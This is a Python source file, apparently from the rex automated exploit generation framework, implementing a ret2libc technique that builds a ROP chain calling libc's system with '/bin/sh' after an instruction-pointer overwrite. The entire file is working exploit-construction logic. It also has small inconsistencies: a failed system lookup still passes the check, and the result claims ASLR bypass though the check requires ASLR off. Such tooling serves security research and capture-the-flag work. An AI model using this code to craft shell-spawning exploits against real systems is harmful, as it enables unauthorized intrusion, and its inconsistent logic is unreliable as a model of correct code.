import logging

from angrop.errors import RopException

from ...vulnerability import Vulnerability
from ..technique import Technique
from .. import Exploit, CannotExploit

l = logging.getLogger("rex.exploit.techniques.ret2libc")

class Ret2Libc(Technique):

    name = "ret2libc"
    applicable_to = ['unix']

    def check(self):
        if self.libc_rop is None:
            self.check_fail_reason("No libc ROP available.")
            return False

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            self.check_fail_reason("Cannot control IP.")
            return False

        # can only work when aslr is off
        if self.crash.aslr:
            self.check_fail_reason("Cannot work when ASLR is on.")
            return False

        # there should be a system function
        system_addr = self._find_libc_func_address("system")
        if not system_addr:
            self.check_fail_reason("Cannot find system in libc.")

        return True

    def _find_writable_region(self, data):
        segments = self.libc_rop.project.loader.main_object.segments
        for seg in segments:
            if seg.flags & 2:
                return seg.max_addr - len(data)
        raise RopException("Cannot find writable region inside libc")

    def _write_cmd_str(self, cmd_str):
        # only use write with ROP

        # look for writable address
        addr = self._find_writable_region(cmd_str)

        # write rop chain to the address
        chain = self.crash.libc_rop.write_to_mem(addr, cmd_str)
        chain, chain_addr = self._ip_overwrite_with_chain(chain, rop=self.libc_rop)

        # add constraints
        chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
        chain_bvv = self.crash.state.solver.BVV(chain.payload_str())
        self.crash.state.add_constraints(chain_mem == chain_bvv)

        # windup
        self._windup_to_unconstrained_successor()

        glob_data = self.crash.state.memory.load(addr, len(cmd_str))
        data_bvv  = self.crash.state.solver.BVV(cmd_str)
        return addr, (glob_data == data_bvv)

    def apply(self, cmd=b'/bin/sh', **kwargs):
        cmd_str = cmd + b'\x00'
        system_addr = self._find_libc_func_address("system")

        # look for cmd_str, usually "/bin/sh\x00", if it does not exist in the binary, write it to the memory
        cmd_addr = next(self.crash.project.loader.main_object.memory.find(cmd_str), None)
        if cmd_addr:
            cmd_addr += self.crash.project.loader.main_object.mapped_base

        if not cmd_addr:
            # write out cmd_str
            cmd_addr, cmd_constraint = self._write_cmd_str(cmd_str)
            # apply the constraint that cmd_str must exist in the binary
            self.crash.state.add_constraints(cmd_constraint)

        # craft the caller chain
        try:
            chain = self.libc_rop.func_call(system_addr, [cmd_addr])
        except RopException:
            raise CannotExploit("[%s] cannot craft caller chain" % self.name)

        # insert the chain into the binary
        try:
            chain, chain_addr = self._ip_overwrite_with_chain(chain, state=self.crash.state, rop=self.libc_rop)
        except CannotExploit:
            raise CannotExploit("[%s] unable to insert chain" % self.name)

        # add the constraint to the state that the chain must exist at the address
        chain_mem = self.crash.state.memory.load(chain_addr, chain.payload_len)
        self.crash.state.add_constraints(chain_mem == self.crash.state.solver.BVV(chain.payload_str()))

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)

        return Exploit(self.crash, bypasses_nx=True, bypasses_aslr=True)